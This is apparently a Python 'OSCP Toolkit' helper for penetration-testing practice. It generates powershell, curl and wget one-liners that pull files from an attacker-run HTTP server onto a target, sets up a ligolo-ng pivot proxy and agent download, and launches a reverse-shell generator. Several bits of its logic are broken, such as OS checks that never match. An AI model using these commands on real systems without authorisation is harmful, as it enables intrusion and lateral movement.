#!/usr/bin/env python3

import pyfiglet
import pyperclip
import os
import random
import sys
from colorama import Fore, Style, init
init(autoreset=True)


###to do: implment try statements and error handling

#File transfers: spin up a quick http server and command to transfer files to the target

def fileTransfer(ip,port,file):

	payload_choice = input("powershell, wget or curl?: ").strip().lower()

	if payload_choice not in ["powershell","wget", "curl"]:
		print("[-] Invalid input. Choose powershell, wget or curl.")
		return

	elif payload_choice == "powershell":


		powershell_command = (f"powershell -c iwr -uri http://{ip}:{port}/{file} -OutFile {file}")
		print(powershell_command)
		pyperclip.copy(powershell_command)
		print("[+] command copied to clipboard.")
		os.system(f"python3 -m http.server {port}")

	elif payload_choice == "curl":

		curl_command = (f"curl -o {file} http://{ip}:{port}/{file}")
		print(curl_command)
		pyperclip.copy(curl_command)
		print("[+] command copied to clipboard.")
		os.system(f"python3 -m http.server {port}")

	elif payload_choice == "wget":


		wget_command = (f"wget http://{ip}:{port}/{file}")
		print(wget_command)
		pyperclip.copy(wget_command)
		print("[+] command copied to clipboard.")
		os.system(f"python3 -m http.server {port}")


#Start ligolo up and spin up http server to move agent to the target machine

def ligolo(ip,port,agent_ip,agent_file):

	serv_port = random.randint(10000,12000)
	os.system(f" tmux split-window -h 'python3 -m http.server -d /opt/ligolo-ng {serv_port}'  && sudo /opt/ligolo-ng/proxy -selfcert -laddr {ip}:{port}")
	agent = (f"curl -o agent http://{ip}:{serv_port}/{agent_file}")
	pyperclip.copy(agent)

#
def reverse_shell():

	os.system("cd /opt/reverse-shell-generator &&  sudo docker run -d -p 80:80 reverse_shell_generator")
	paste = ("http:///127.0.0.1")
	pyperclip.copy(paste)
	print(f"{paste} has been copied to your clipboard, paste it in your browser")




if __name__ == '__main__':

	banner = pyfiglet.figlet_format("OSCP Toolkit")
	print (Fore.CYAN + banner)
	print (Fore.YELLOW + "Created by 0xBash1127\n")

	while True:

		try:
			toolkit = "[1] File Transfer Payload\n[2] Ligolo setup\n[3] Reverse Shell\n[4] Exit"
						
			print(toolkit)

			toolkit_choice = int(input("Enter your choice: "))

			if toolkit_choice in [1,2,3,4]:
				break

			else:
				print("[-] Please enter a valid option (1-4)")

		except ValueError:
			print("[-] Please enter a number.")
			
	try:


		if toolkit_choice == 1:

			ip = input("Enter the IP: ")
			port = int(input("Enter the port: "))
			file = input("Enter the filename: ")
			fileTransfer(ip,port,file)

		elif toolkit_choice == 2:
			ip = input("Enter the IP: ")
			port = int(input("Enter the port: "))
			agent_ip = input("Enter target ip: ")
			OS = input("Windows or Linux: ").strip().lower()
			if OS == "Windows": 
				agent_file = "agent.exe"

			elif OS == "Linux":
				agent_file = "agent"

			else:
				print("[-] Unkown OS type. Defaulting to 'agent'")
				agent_file = "agent"
		
			ligolo(ip,port,agent_ip,agent_file)

		elif toolkit_choice == 3:

			reverse_shell()


		elif toolkit_choice == "4":
			sys.exit()

		else:
			print("Please enter a number of an option listed")


	except KeyboardInterrupt:
		print("\nExiting...")

	
